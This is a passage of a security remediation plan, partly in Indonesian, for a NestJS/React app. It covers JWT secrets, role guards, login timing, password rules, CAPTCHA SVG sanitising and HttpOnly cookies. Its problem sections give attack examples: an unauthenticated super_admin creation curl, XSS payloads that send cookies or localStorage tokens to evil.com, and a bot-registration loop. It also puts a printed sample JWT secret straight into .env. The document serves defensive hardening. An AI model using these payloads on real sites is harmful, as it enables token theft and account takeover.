Update `/opt/sikancil/backend/src/modules/auth/strategies/jwt.strategy.ts`:

```typescript
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { ConfigService } from '@nestjs/config';
import { UsersService } from '../../users/users.service';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(
    private configService: ConfigService,
    private usersService: UsersService,
  ) {
    const secret = configService.get<string>('JWT_SECRET');

    // ✅ REMOVE hardcoded fallback - let it fail if not set
    if (!secret) {
      throw new Error('JWT_SECRET is not configured');
    }

    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: secret, // ✅ No fallback
    });
  }

  async validate(payload: JwtPayload) {
    const user = await this.usersService.findOne(payload.sub);

    if (!user) {
      throw new UnauthorizedException('User not found');
    }

    if (user.status !== 'active') {
      throw new UnauthorizedException('User account is not active');
    }

    return user;
  }
}
```

**🧪 Testing:**

```bash
# Test 1: Missing JWT_SECRET
# Comment out JWT_SECRET in .env
# Restart backend
# Expected: Error on startup with clear message

# Test 2: Weak JWT_SECRET
# Set JWT_SECRET=secret in .env
# Restart backend
# Expected: Warning in console (dev) or error (production)

# Test 3: Valid JWT_SECRET
# Set JWT_SECRET=<long random string> in .env
# Restart backend
# Expected: No errors or warnings
```

**Generate strong secret:**

```bash
# Generate a strong 64-character secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Example output: 8f7d3a9e2b1c4f6e8a7d5c3b9e2f1a8d6c4e9f7a3b5d8e2c1f6a9d3e7b4c2f1a
```

Update `.env`:
```env
JWT_SECRET=8f7d3a9e2b1c4f6e8a7d5c3b9e2f1a8d6c4e9f7a3b5d8e2c1f6a9d3e7b4c2f1a
JWT_EXPIRES_IN=15m
```

**✅ Success Criteria:**
- [ ] App crashes on startup if JWT_SECRET not set
- [ ] Warning shown if JWT_SECRET is weak (dev mode)
- [ ] Error thrown if JWT_SECRET is weak (production mode)
- [ ] No hardcoded fallback secrets

---

### 2.4 Protect UsersController Endpoints

**📁 Files:**
- `/opt/sikancil/backend/src/modules/users/users.controller.ts`
- `/opt/sikancil/backend/src/common/guards/roles.guard.ts` (create new)
- `/opt/sikancil/backend/src/common/decorators/roles.decorator.ts` (create new)

**🐛 Masalah:**

```typescript
// users.controller.ts - NO GUARDS
@ApiTags('users')
@Controller('users')
export class UsersController {

  @Post() // ❌ Anyone can create users
  create(@Body() createUserDto: CreateUserDto) { ... }

  @Get() // ❌ Anyone can list all users
  findAll(@Query() query: any) { ... }

  @Delete(':id') // ❌ Anyone can delete users
  remove(@Param('id') id: string) { ... }
}
```

**Attack:**
```bash
# Create admin user without authentication
curl -X POST http://localhost:3000/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hack@er.com","password":"Pass123!","fullName":"Hacker","role":"super_admin"}'
# ❌ Success - hacker is now super_admin
```

**✅ Solusi:**

**Step 1:** Create Roles Decorator

Buat file: `/opt/sikancil/backend/src/common/decorators/roles.decorator.ts`

```typescript
import { SetMetadata } from '@nestjs/common';

export const ROLES_KEY = 'roles';
export const Roles = (...roles: string[]) => SetMetadata(ROLES_KEY, roles);
```

**Step 2:** Create Roles Guard

Buat file: `/opt/sikancil/backend/src/common/guards/roles.guard.ts`

```typescript
import { Injectable, CanActivate, ExecutionContext } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { ROLES_KEY } from '../decorators/roles.decorator';

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);

    if (!requiredRoles || requiredRoles.length === 0) {
      return true; // No roles required, allow access
    }

    const { user } = context.switchToHttp().getRequest();

    if (!user) {
      return false; // No user (should be caught by JwtAuthGuard first)
    }

    // Check if user has any of the required roles
    return requiredRoles.some((role) => user.role === role);
  }
}
```

**Step 3:** Apply Guards to UsersController

Edit `/opt/sikancil/backend/src/modules/users/users.controller.ts`:

```typescript
import {
  Controller, Get, Post, Body, Patch, Param, Delete,
  Query, UseGuards, UseInterceptors, Request
} from '@nestjs/common';
import { ApiTags, ApiOperation, ApiResponse, ApiBearerAuth } from '@nestjs/swagger';
import { JwtAuthGuard } from '../../common/guards/jwt-auth.guard';
import { RolesGuard } from '../../common/guards/roles.guard';
import { Roles } from '../../common/decorators/roles.decorator';
import { ClassSerializerInterceptor } from '@nestjs/common';
import { UsersService } from './users.service';
import { CreateUserDto, UpdateUserDto } from './dto';

@ApiTags('users')
@ApiBearerAuth()
@Controller('users')
@UseGuards(JwtAuthGuard, RolesGuard) // ✅ Protect all endpoints
@UseInterceptors(ClassSerializerInterceptor)
export class UsersController {
  constructor(private readonly usersService: UsersService) {}

  @Post()
  @Roles('super_admin', 'admin') // ✅ Only admins can create users
  @ApiOperation({ summary: 'Create new user' })
  @ApiResponse({ status: 201, description: 'User created successfully' })
  create(@Body() createUserDto: CreateUserDto, @Request() req) {
    return this.usersService.create(createUserDto, req.user.id);
  }

  @Get()
  @Roles('super_admin', 'admin') // ✅ Only admins can list users
  @ApiOperation({ summary: 'Get all users' })
  @ApiResponse({ status: 200, description: 'List of users' })
  findAll(@Query() query: any) {
    return this.usersService.findAll(query);
  }

  @Get(':id')
  @Roles('super_admin', 'admin') // ✅ Only admins can view user details
  @ApiOperation({ summary: 'Get user by ID' })
  @ApiResponse({ status: 200, description: 'User found' })
  @ApiResponse({ status: 404, description: 'User not found' })
  findOne(@Param('id') id: string) {
    return this.usersService.findOne(id);
  }

  @Patch(':id')
  @Roles('super_admin', 'admin') // ✅ Only admins can update users
  @ApiOperation({ summary: 'Update user' })
  @ApiResponse({ status: 200, description: 'User updated successfully' })
  update(
    @Param('id') id: string,
    @Body() updateUserDto: UpdateUserDto,
    @Request() req,
  ) {
    return this.usersService.update(id, updateUserDto, req.user.id);
  }

  @Delete(':id')
  @Roles('super_admin') // ✅ Only super_admin can delete users
  @ApiOperation({ summary: 'Delete user (soft delete)' })
  @ApiResponse({ status: 200, description: 'User deleted successfully' })
  remove(@Param('id') id: string) {
    return this.usersService.remove(id);
  }

  // ✅ Fiscal year endpoints already have guards individually
  @Patch('me/fiscal-year')
  @ApiOperation({ summary: 'Update current user fiscal year preference' })
  updateMyFiscalYear(@Request() req, @Body('fiscalYearId') fiscalYearId: string) {
    return this.usersService.updateActiveFiscalYear(req.user.id, fiscalYearId);
  }

  @Patch(':id/fiscal-year')
  @Roles('super_admin', 'admin')
  @ApiOperation({ summary: 'Update user fiscal year preference' })
  updateUserFiscalYear(
    @Param('id') id: string,
    @Body('fiscalYearId') fiscalYearId: string,
  ) {
    return this.usersService.updateActiveFiscalYear(id, fiscalYearId);
  }
}
```

**🧪 Testing:**

```bash
# Test 1: Unauthenticated access
curl http://localhost:3000/api/v1/users
# Expected: 401 Unauthorized

# Test 2: Authenticated as regular user
curl -H "Authorization: Bearer <user-token>" \
  http://localhost:3000/api/v1/users
# Expected: 403 Forbidden (no admin role)

# Test 3: Authenticated as admin
curl -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/api/v1/users
# Expected: 200 OK with user list

# Test 4: Try to delete as admin (not super_admin)
curl -X DELETE \
  -H "Authorization: Bearer <admin-token>" \
  http://localhost:3000/api/v1/users/<some-id>
# Expected: 403 Forbidden

# Test 5: Delete as super_admin
curl -X DELETE \
  -H "Authorization: Bearer <super-admin-token>" \
  http://localhost:3000/api/v1/users/<some-id>
# Expected: 200 OK
```

**✅ Success Criteria:**
- [ ] All user endpoints require authentication
- [ ] CRUD operations require admin role
- [ ] Delete requires super_admin role
- [ ] 401 for unauthenticated, 403 for insufficient role

---

### 2.5 Fix User Status Check Timing Attack

**📁 File:** `/opt/sikancil/backend/src/modules/auth/auth.service.ts`

**🐛 Masalah:**

```typescript
// auth.service.ts - validateUser method
async validateUser(username: string, password: string): Promise<User | null> {
  const user = await this.usersService.findByUsername(username);
  if (!user) return null;

  // ❌ PASSWORD CHECK FIRST
  const isPasswordValid = await bcrypt.compare(password, user.password);
  if (!isPasswordValid) return null;

  // ❌ STATUS CHECK AFTER PASSWORD
  if (user.status !== 'active') {
    throw new UnauthorizedException('User account is not active');
  }

  return user;
}
```

**Timing Attack:**
```
User exists + wrong password:
- DB query: 50ms
- bcrypt.compare: 100ms (expensive operation)
- Total: ~150ms

User suspended + correct password:
- DB query: 50ms
- bcrypt.compare: 100ms
- Status check: immediate
- Total: ~150ms + exception throw

Attacker can measure timing to determine:
1. If username exists
2. If account is suspended vs wrong password
```

**✅ Solusi:**

```typescript
// /opt/sikancil/backend/src/modules/auth/auth.service.ts

async validateUser(username: string, password: string): Promise<User | null> {
  const user = await this.usersService.findByUsername(username);

  if (!user) {
    // ✅ Run dummy bcrypt to maintain constant time
    // This prevents timing attack to detect if username exists
    await bcrypt.compare(
      password,
      '$2b$10$dummyhashXYZ1234567890abcdefghijklmnopqrstuv' // Fake hash
    );
    return null;
  }

  // ✅ CHECK STATUS BEFORE PASSWORD
  // This prevents leaking account status via timing
  if (user.status !== 'active') {
    // ✅ Still run bcrypt to maintain constant time
    await bcrypt.compare(password, user.password);
    // ✅ Return null instead of throwing specific exception
    // Generic error message will be shown by caller
    return null;
  }

  const isPasswordValid = await bcrypt.compare(password, user.password);

  if (!isPasswordValid) {
    return null;
  }

  return user;
}
```

Update caller di login method:

```typescript
async login(loginDto: LoginDto) {
  const user = await this.validateUser(loginDto.username, loginDto.password);

  if (!user) {
    // ✅ Generic error message for all failure cases
    throw new UnauthorizedException('Username atau password salah');
  }

  // ... rest of login logic (fiscal year, token generation)
}
```

**🧪 Testing:**

```bash
# This test requires precise timing measurement
# Use a tool like Apache Bench or custom script

# Test 1: Non-existent user
time curl -X POST http://localhost:3000/api/v1/auth/login \
  -d '{"username":"nonexistent","password":"any","captchaId":"x","captcha":"x"}'

# Test 2: Existing user, wrong password
time curl -X POST http://localhost:3000/api/v1/auth/login \
  -d '{"username":"realuser","password":"wrong","captchaId":"x","captcha":"x"}'

# Test 3: Suspended user, correct password
time curl -X POST http://localhost:3000/api/v1/auth/login \
  -d '{"username":"suspended","password":"correct","captchaId":"x","captcha":"x"}'

# Expected: All three should take approximately the same time (~100-150ms)
# All should return same generic error message
```

**✅ Success Criteria:**
- [ ] All failed login attempts take similar time
- [ ] Same generic error message for all failures
- [ ] No information leakage about account status
- [ ] No information leakage about username existence

---

### 2.6 Implement Strict Password Requirements

**📁 Files:**
- `/opt/sikancil/backend/src/modules/auth/dto/register.dto.ts`
- `/opt/sikancil/frontend/src/features/auth/schemas.ts`

**User Decision:** Min 8 char, uppercase+lowercase+number+symbol ✅

**🐛 Current State:**

```typescript
// Backend - weak requirement
@MinLength(6) password: string;

// Frontend - weak requirement
password: z.string().min(6, 'Password minimal 6 karakter'),
```

**✅ Solusi Backend:**

Edit `/opt/sikancil/backend/src/modules/auth/dto/register.dto.ts`:

```typescript
import {
  IsString,
  IsEmail,
  IsNotEmpty,
  MinLength,
  MaxLength,
  Matches,
} from 'class-validator';
import { ApiProperty } from '@nestjs/swagger';

export class RegisterDto {
  @ApiProperty({ example: 'johndoe' })
  @IsString()
  @IsNotEmpty({ message: 'Username wajib diisi' })
  @MinLength(3, { message: 'Username minimal 3 karakter' })
  @MaxLength(50, { message: 'Username maksimal 50 karakter' })
  @Matches(/^[a-zA-Z0-9_]+$/, {
    message: 'Username hanya boleh mengandung huruf, angka, dan underscore',
  })
  username: string;

  @ApiProperty({ example: 'john.doe@example.com' })
  @IsEmail({}, { message: 'Format email tidak valid' })
  @IsNotEmpty({ message: 'Email wajib diisi' })
  email: string;

  @ApiProperty({ example: 'SecureP@ss123' })
  @IsString()
  @IsNotEmpty({ message: 'Password wajib diisi' })
  @MinLength(8, { message: 'Password minimal 8 karakter' })
  @MaxLength(100, { message: 'Password maksimal 100 karakter' })
  @Matches(
    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/,
    {
      message: 'Password harus mengandung minimal 1 huruf besar, 1 huruf kecil, 1 angka, dan 1 karakter spesial (@$!%*?&)',
    }
  )
  password: string;

  @ApiProperty({ example: 'John Doe' })
  @IsString()
  @IsNotEmpty({ message: 'Nama lengkap wajib diisi' })
  @MinLength(3, { message: 'Nama lengkap minimal 3 karakter' })
  @MaxLength(100, { message: 'Nama lengkap maksimal 100 karakter' })
  fullName: string;
}
```

**✅ Solusi Frontend:**

Edit `/opt/sikancil/frontend/src/features/auth/schemas.ts`:

```typescript
export const registerSchema = z
  .object({
    username: z
      .string()
      .min(1, 'Username wajib diisi')
      .min(3, 'Username minimal 3 karakter')
      .max(50, 'Username maksimal 50 karakter')
      .regex(
        /^[a-zA-Z0-9_]+$/,
        'Username hanya boleh huruf, angka, dan underscore'
      ),

    email: z
      .string()
      .min(1, 'Email wajib diisi')
      .email('Format email tidak valid'),

    fullName: z
      .string()
      .min(1, 'Nama lengkap wajib diisi')
      .min(3, 'Nama lengkap minimal 3 karakter')
      .max(100, 'Nama lengkap maksimal 100 karakter'),

    password: z
      .string()
      .min(1, 'Password wajib diisi')
      .min(8, 'Password minimal 8 karakter')
      .max(100, 'Password maksimal 100 karakter')
      .regex(/[a-z]/, 'Password harus mengandung huruf kecil')
      .regex(/[A-Z]/, 'Password harus mengandung huruf besar')
      .regex(/[0-9]/, 'Password harus mengandung angka')
      .regex(/[@$!%*?&]/, 'Password harus mengandung karakter spesial (@$!%*?&)'),

    confirmPassword: z
      .string()
      .min(1, 'Konfirmasi password wajib diisi'),
  })
  .refine((data) => data.password === data.confirmPassword, {
    message: 'Password tidak cocok',
    path: ['confirmPassword'],
  });
```

**Optional: Password Strength Indicator**

Buat component `/opt/sikancil/frontend/src/components/PasswordStrengthIndicator.tsx`:

```typescript
interface PasswordStrengthIndicatorProps {
  password: string;
}

export const PasswordStrengthIndicator = ({ password }: PasswordStrengthIndicatorProps) => {
  const checks = [
    { label: 'Minimal 8 karakter', valid: password.length >= 8 },
    { label: 'Huruf kecil (a-z)', valid: /[a-z]/.test(password) },
    { label: 'Huruf besar (A-Z)', valid: /[A-Z]/.test(password) },
    { label: 'Angka (0-9)', valid: /[0-9]/.test(password) },
    { label: 'Karakter spesial (@$!%*?&)', valid: /[@$!%*?&]/.test(password) },
  ];

  const strength = checks.filter(c => c.valid).length;
  const strengthLabel = ['Sangat Lemah', 'Lemah', 'Sedang', 'Kuat', 'Sangat Kuat'][strength] || 'Sangat Lemah';
  const strengthColor = ['red', 'orange', 'yellow', 'lime', 'green'][strength] || 'red';

  if (!password) return null;

  return (
    <div className="mt-2 space-y-2">
      <div className="flex items-center gap-2">
        <div className="flex-1 h-2 bg-gray-200 rounded-full overflow-hidden">
          <div
            className={`h-full bg-${strengthColor}-500 transition-all`}
            style={{ width: `${(strength / 5) * 100}%` }}
          />
        </div>
        <span className="text-sm text-muted-foreground">{strengthLabel}</span>
      </div>
      <ul className="text-xs space-y-1">
        {checks.map((check, i) => (
          <li key={i} className={check.valid ? 'text-green-600' : 'text-gray-400'}>
            {check.valid ? '✓' : '○'} {check.label}
          </li>
        ))}
      </ul>
    </div>
  );
};
```

**🧪 Testing:**

```bash
# Test weak passwords
curl -X POST http://localhost:3000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"weak","fullName":"Test User"}'
# Expected: 400 with validation error

curl -X POST http://localhost:3000/api/v1/auth/register \
  -d '{"username":"test","email":"test@test.com","password":"NoNumber!","fullName":"Test User"}'
# Expected: 400 "harus mengandung angka"

curl -X POST http://localhost:3000/api/v1/auth/register \
  -d '{"username":"test","email":"test@test.com","password":"NoSpecial123","fullName":"Test User"}'
# Expected: 400 "harus mengandung karakter spesial"

# Test strong password
curl -X POST http://localhost:3000/api/v1/auth/register \
  -d '{"username":"test123","email":"test@test.com","password":"SecureP@ss123","fullName":"Test User","captchaId":"x","captcha":"x"}'
# Expected: 201 Created (or CAPTCHA error)
```

**✅ Success Criteria:**
- [ ] Passwords < 8 chars rejected
- [ ] Passwords without uppercase rejected
- [ ] Passwords without lowercase rejected
- [ ] Passwords without numbers rejected
- [ ] Passwords without special chars rejected
- [ ] Strong passwords accepted

---

### 2.7 Sanitize CAPTCHA SVG di Frontend

**📁 File:** `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

**🐛 Masalah:**

```typescript
// LINE 184 - Dangerous without sanitization
<div
  dangerouslySetInnerHTML={{ __html: captchaData.svg }}
  className="w-[120px] h-[40px]"
/>
```

**XSS Risk:** Jika `svg-captcha` library compromised atau backend returns malicious SVG:
```xml
<svg>
  <script>alert('XSS')</script>
  <image onload="fetch('https://evil.com?cookie='+document.cookie)" />
</svg>
```

**✅ Solusi:**

**Step 1:** Install DOMPurify

```bash
cd frontend
pnpm add dompurify
pnpm add -D @types/dompurify
```

**Step 2:** Sanitize SVG before rendering

Edit `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`:

```typescript
import DOMPurify from 'dompurify';

// ... existing imports

export const LoginForm = () => {
  // ... existing code

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
      {/* ... other fields ... */}

      {/* CAPTCHA Section */}
      <div className="space-y-2">
        <Label htmlFor="captcha">Verifikasi CAPTCHA</Label>
        <div className="flex items-start gap-2">
          {/* CAPTCHA Display */}
          <div
            className="flex-shrink-0 border rounded bg-muted p-2 cursor-pointer"
            onClick={fetchCaptcha}
            title="Klik untuk refresh CAPTCHA"
          >
            {isLoadingCaptcha ? (
              <div className="w-[120px] h-[40px] flex items-center justify-center">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary"></div>
              </div>
            ) : captchaData ? (
              <div
                dangerouslySetInnerHTML={{
                  // ✅ SANITIZE SVG before rendering
                  __html: DOMPurify.sanitize(captchaData.svg, {
                    USE_PROFILES: { svg: true },
                    ALLOWED_TAGS: ['svg', 'path', 'rect', 'text', 'g', 'line', 'circle'],
                    ALLOWED_ATTR: ['viewBox', 'xmlns', 'fill', 'stroke', 'stroke-width', 'x', 'y', 'd', 'width', 'height', 'transform', 'cx', 'cy', 'r', 'x1', 'y1', 'x2', 'y2'],
                    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
                    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
                  })
                }}
                className="w-[120px] h-[40px]"
              />
            ) : (
              <div className="w-[120px] h-[40px] flex items-center justify-center text-sm text-muted-foreground">
                Klik untuk load
              </div>
            )}
          </div>

          {/* Refresh Button */}
          <button
            type="button"
            onClick={fetchCaptcha}
            disabled={isLoadingCaptcha}
            className="p-2 hover:bg-muted rounded-md transition-colors"
            title="Refresh CAPTCHA"
          >
            <RefreshCw
              size={20}
              className={isLoadingCaptcha ? 'animate-spin' : ''}
            />
          </button>
        </div>

        {/* ... rest of CAPTCHA field ... */}
      </div>
    </form>
  );
};
```

**Alternative: CSP Header (Backend)**

Sebagai layer tambahan, tambahkan Content Security Policy di backend:

Edit `/opt/sikancil/backend/src/main.ts`:

```typescript
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // ✅ Configure helmet with CSP
  app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          scriptSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"], // Allow inline styles for SVG
          imgSrc: ["'self'", 'data:', 'blob:'],
          connectSrc: ["'self'"],
          fontSrc: ["'self'"],
          objectSrc: ["'none'"],
          mediaSrc: ["'self'"],
          frameSrc: ["'none'"],
        },
      },
    })
  );

  // ... rest of bootstrap
}
```

**🧪 Testing:**

```bash
# Test 1: Normal CAPTCHA renders correctly
# - Open login page
# - CAPTCHA should display
# - Check browser console - no errors

# Test 2: Malicious SVG attempt (requires backend modification for testing)
# Temporarily modify captcha.service.ts to return malicious SVG:
svg: '<svg><script>alert("XSS")</script><text>TEST</text></svg>'

# Result with DOMPurify:
# - Script tag stripped
# - Only text "TEST" renders
# - No alert shown

# Test 3: Check sanitized HTML in DevTools
# - Inspect CAPTCHA element
# - Verify no script tags, no event handlers
# - Only allowed SVG elements present
```

**✅ Success Criteria:**
- [ ] CAPTCHA displays correctly
- [ ] No script tags in rendered HTML
- [ ] No event handlers (onload, onclick, etc.) in rendered HTML
- [ ] Only whitelisted SVG elements allowed

---

### 2.8 Add CAPTCHA to Register Endpoint

**📁 Files:**
- `/opt/sikancil/backend/src/modules/auth/dto/register.dto.ts`
- `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`
- `/opt/sikancil/frontend/src/features/auth/pages/RegisterPage.tsx` (if exists)
- `/opt/sikancil/frontend/src/features/auth/schemas.ts`

**🐛 Masalah:**

```bash
# Automated bot registration (no CAPTCHA)
for i in {1..1000}; do
  curl -X POST http://localhost:3000/api/v1/auth/register \
    -d "{\"username\":\"bot$i\",\"email\":\"bot$i@spam.com\",\"password\":\"BotPass123!\",\"fullName\":\"Bot $i\"}"
done
# ❌ Creates 1000 spam accounts
```

**✅ Solusi:**

**Step 1:** Update RegisterDto

Edit `/opt/sikancil/backend/src/modules/auth/dto/register.dto.ts`:

```typescript
export class RegisterDto {
  // ... existing fields (username, email, password, fullName)

  @ApiProperty({ example: 'captcha_abc123xyz' })
  @IsString()
  @IsNotEmpty({ message: 'CAPTCHA ID wajib diisi' })
  captchaId: string;

  @ApiProperty({ example: 'AB12' })
  @IsString()
  @IsNotEmpty({ message: 'CAPTCHA wajib diisi' })
  @MinLength(4, { message: 'CAPTCHA minimal 4 karakter' })
  @MaxLength(6, { message: 'CAPTCHA maksimal 6 karakter' })
  captcha: string;
}
```

**Step 2:** Verify CAPTCHA in register endpoint

Edit `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`:

```typescript
@Post('register')
@Throttle({ default: { limit: 3, ttl: 3600000 } }) // 3 per hour
async register(@Body() registerDto: RegisterDto) {
  // ✅ VERIFY CAPTCHA FIRST
  const isCaptchaValid = await this.captchaService.verifyCaptcha(
    registerDto.captchaId,
    registerDto.captcha,
  );

  if (!isCaptchaValid) {
    throw new BadRequestException('CAPTCHA tidak valid atau telah kadaluarsa');
  }

  // Proceed with registration
  return this.authService.register(registerDto);
}
```

**Step 3:** Update frontend register schema

Edit `/opt/sikancil/frontend/src/features/auth/schemas.ts`:

```typescript
export const registerSchema = z
  .object({
    username: z.string()...
    email: z.string()...
    fullName: z.string()...
    password: z.string()...
    confirmPassword: z.string()...

    // ✅ ADD CAPTCHA FIELDS
    captchaId: z.string().min(1, 'CAPTCHA ID wajib diisi'),
    captcha: z.string().min(1, 'CAPTCHA wajib diisi'),
  })
  .refine((data) => data.password === data.confirmPassword, {
    message: 'Password tidak cocok',
    path: ['confirmPassword'],
  });
```

**Step 4:** Add CAPTCHA to RegisterPage/Form (if exists)

If register form exists, add CAPTCHA component sama seperti di LoginForm:

```typescript
// RegisterForm.tsx (similar pattern to LoginForm)
const [captchaData, setCaptchaData] = useState<{ id: string; svg: string } | null>(null);
const [isLoadingCaptcha, setIsLoadingCaptcha] = useState(false);

const fetchCaptcha = async () => {
  setIsLoadingCaptcha(true);
  try {
    const response = await apiClient.get<{ id: string; svg: string }>('/auth/captcha');
    setCaptchaData(response.data);
    setValue('captchaId', response.data.id);
    setValue('captcha', '');
  } catch (error) {
    console.error('Failed to fetch CAPTCHA:', error);
  } finally {
    setIsLoadingCaptcha(false);
  }
};

useEffect(() => {
  fetchCaptcha();
}, []);

// In JSX, add CAPTCHA field (copy from LoginForm.tsx lines 170-220)
```

**🧪 Testing:**

```bash
# Test without CAPTCHA
curl -X POST http://localhost:3000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"SecureP@ss123","fullName":"Test User"}'
# Expected: 400 "CAPTCHA ID wajib diisi"

# Test with invalid CAPTCHA
curl -X POST http://localhost:3000/api/v1/auth/register \
  -d '{"username":"test","email":"test@test.com","password":"SecureP@ss123","fullName":"Test User","captchaId":"invalid","captcha":"ABCD"}'
# Expected: 400 "CAPTCHA tidak valid"

# Test with valid CAPTCHA
# 1. Get CAPTCHA: curl http://localhost:3000/api/v1/auth/captcha
# 2. Extract ID and solve CAPTCHA
# 3. Register:
curl -X POST http://localhost:3000/api/v1/auth/register \
  -d '{"username":"test","email":"test@test.com","password":"SecureP@ss123","fullName":"Test User","captchaId":"<real-id>","captcha":"<solved>"}'
# Expected: 201 Created
```

**✅ Success Criteria:**
- [ ] Register endpoint requires CAPTCHA
- [ ] Invalid CAPTCHA rejected
- [ ] Register form includes CAPTCHA field
- [ ] Automated registration prevented

---

## FASE 3: TOKEN SECURITY IMPLEMENTATION
**Estimasi: 10-12 jam | Prioritas: MEDIUM-HIGH**

### 3.1 Migrate to HttpOnly Cookies for Token Storage

**User Decision:** HttpOnly Cookies ✅

**📁 Files:**
- Backend:
  - `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`
  - `/opt/sikancil/backend/src/modules/auth/strategies/jwt.strategy.ts`
  - `/opt/sikancil/backend/src/main.ts`
- Frontend:
  - `/opt/sikancil/frontend/src/stores/auth.store.ts`
  - `/opt/sikancil/frontend/src/lib/api-client.ts`
  - `/opt/sikancil/frontend/src/features/auth/hooks/useAuth.ts`
  - `/opt/sikancil/frontend/src/features/auth/api.ts`

**🐛 Current State:**

```typescript
// Frontend - auth.store.ts
login: (user, accessToken, refreshToken) => {
  localStorage.setItem('accessToken', accessToken); // ❌ XSS vulnerable
  localStorage.setItem('refreshToken', refreshToken);
  set({ user, isAuthenticated: true });
}

// api-client.ts
apiClient.interceptors.request.use((config) => {
  const token = localStorage.getItem('accessToken'); // ❌ Reads from localStorage
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**XSS Attack:**
```html
<script>
  // Steal token from localStorage
  fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'));
</script>
```

**✅ Solusi:**

---

#### BACKEND CHANGES

**File 1:** Update JWT Strategy to read from cookies

Edit `/opt/sikancil/backend/src/modules/auth/strategies/jwt.strategy.ts`:

```typescript
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { ConfigService } from '@nestjs/config';
import { UsersService } from '../../users/users.service';
import { Request } from 'express';

export interface JwtPayload {
  sub: string;
  username: string;
  email: string;
  role: string;
  fiscalYearId?: string;
  fiscalYear?: number;
}

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(
    private configService: ConfigService,
    private usersService: UsersService,
  ) {
    const secret = configService.get<string>('JWT_SECRET');

    if (!secret) {
      throw new Error('JWT_SECRET is not configured');
    }

    super({
      // ✅ Extract JWT from cookie instead of Authorization header
      jwtFromRequest: ExtractJwt.fromExtractors([
        (request: Request) => {
          let token = null;
          if (request && request.cookies) {
            token = request.cookies['accessToken']; // Read from cookie
          }
          return token;
        },
      ]),
      ignoreExpiration: false,
      secretOrKey: secret,
    });
  }

  async validate(payload: JwtPayload) {
    const user = await this.usersService.findOne(payload.sub);

    if (!user) {
      throw new UnauthorizedException('User not found');
    }

    if (user.status !== 'active') {
      throw new UnauthorizedException('User account is not active');
    }

    return user;
  }
}
```

**File 2:** Set cookies in login response

Edit `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`:

```typescript
import { Response } from 'express';
import {
  Controller,
  Post,
  Get,
  Body,
  Res,
  Req,
  HttpCode,
  HttpStatus,
} from '@nestjs/common';

@Controller('auth')
export class AuthController {
  constructor(
    private readonly authService: AuthService,
    private readonly captchaService: CaptchaService,
  ) {}

  @Post('login')
  @Throttle({ default: { limit: 5, ttl: 60000 } })
  @HttpCode(HttpStatus.OK)
  async login(
    @Body() loginDto: LoginDto,
    @Res({ passthrough: true }) res: Response, // ✅ Get Response object
  ) {
    const isCaptchaValid = await this.captchaService.verifyCaptcha(
      loginDto.captchaId,
      loginDto.captcha,
    );

    if (!isCaptchaValid) {
      throw new BadRequestException('CAPTCHA tidak valid atau telah kadaluarsa');
    }

    const result = await this.authService.login(loginDto);

    // ✅ SET ACCESS TOKEN IN HTTPONLY COOKIE
    res.cookie('accessToken', result.access_token, {
      httpOnly: true,  // Cannot be accessed by JavaScript
      secure: process.env.NODE_ENV === 'production', // HTTPS only in production
      sameSite: 'strict', // CSRF protection
      maxAge: 15 * 60 * 1000, // 15 minutes
      path: '/',
    });

    // ✅ SET REFRESH TOKEN IN HTTPONLY COOKIE
    res.cookie('refreshToken', result.refresh_token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
      path: '/',
    });

    // ✅ RETURN USER DATA (NO TOKENS IN RESPONSE BODY)
    return {
      user: result.user,
      fiscalYear: result.fiscalYear,
    };
  }

  @Post('logout')
  @HttpCode(HttpStatus.OK)
  logout(@Res({ passthrough: true }) res: Response) {
    // ✅ CLEAR COOKIES
    res.clearCookie('accessToken');
    res.clearCookie('refreshToken');

    return { message: 'Logged out successfully' };
  }

  @Post('register')
  @Throttle({ default: { limit: 3, ttl: 3600000 } })
  async register(
    @Body() registerDto: RegisterDto,
    @Res({ passthrough: true }) res: Response,
  ) {
    const isCaptchaValid = await this.captchaService.verifyCaptcha(
      registerDto.captchaId,
      registerDto.captcha,
    );

    if (!isCaptchaValid) {
      throw new BadRequestException('CAPTCHA tidak valid atau telah kadaluarsa');
    }

    const result = await this.authService.register(registerDto);

    // ✅ SET COOKIES FOR NEW USER
